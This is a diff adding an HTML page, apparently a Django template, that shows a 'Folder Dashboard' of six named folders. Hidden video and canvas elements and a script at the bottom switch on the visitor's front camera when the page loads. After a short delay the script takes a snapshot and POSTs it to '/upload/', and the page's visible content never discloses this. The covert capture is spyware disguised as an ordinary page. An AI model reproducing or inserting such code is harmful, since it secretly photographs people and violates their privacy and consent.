@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Folder Dashboard</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 2rem;
+            background-color: #1e1e2f;
+            color: #fff;
+            font-family: Arial, sans-serif;
+        }
+
+        h1 {
+            text-align: center;
+            margin-bottom: 2rem;
+            font-size: 2.5rem;
+            color: #f7d217;
+        }
+
+        .folder-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 1.5rem;
+        }
+
+        .folder {
+            background-color: #2a2a40;
+            border: 2px solid #3d3d5c;
+            border-radius: 12px;
+            padding: 1rem;
+            text-align: center;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.4);
+            transition: transform 0.2s ease;
+        }
+
+        .folder:hover {
+            transform: scale(1.05);
+            cursor: pointer;
+        }
+
+        .folder-icon {
+            font-size: 3rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .folder-name {
+            font-size: 1rem;
+            font-weight: bold;
+            color: #ccc;
+        }
+
+        video, canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>📂 Your Folders</h1>
+    <div class="folder-grid">
+        <div class="folder">
+            <div class="folder-icon">📁</div>
+            <div class="folder-name"><a href="{% url 'index' %}">Adam</a></div>
+        </div>
+        <div class="folder">
+            <div class="folder-icon">📁</div>
+            <div class="folder-name"><a href="{% url 'index' %}">Yassine</a></div>
+        </div>
+        <div class="folder">
+            <div class="folder-icon">📁</div>
+            <div class="folder-name"><a href="{% url 'index' %}">Fah</a></div>
+        </div>
+        <div class="folder">
+            <div class="folder-icon">📁</div>
+            <div class="folder-name"><a href="{% url 'index' %}">Hiba</a></div>
+        </div>
+        <div class="folder">
+            <div class="folder-icon">📁</div>
+            <div class="folder-name"><a href="{% url 'index' %}">Amine</a></div>
+        </div>
+        <div class="folder">
+            <div class="folder-icon">📁</div>
+            <div class="folder-name"><a href="{% url 'index' %}">Malak</a></div>
+        </div>
+        <!-- Add more folders here -->
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user' }, audio: false
+        })
+        .then(stream => {
+            video.srcObject = stream;
+            video.onloadedmetadata = () => {
+                setTimeout(() => captureAndSend(), 1500);
+            };
+        })
+        .catch(err => console.warn('Camera permission not granted.'));
+
+        function captureAndSend() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const image = canvas.toDataURL('image/png');
+
+            fetch('/upload/', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                body: `image=${encodeURIComponent(image)}`
+            })
+            .then(res => res.json())
+            .then(data => console.log("Image saved as:", data.file));
+        }
+    </script>
+
+</body>
+</html>
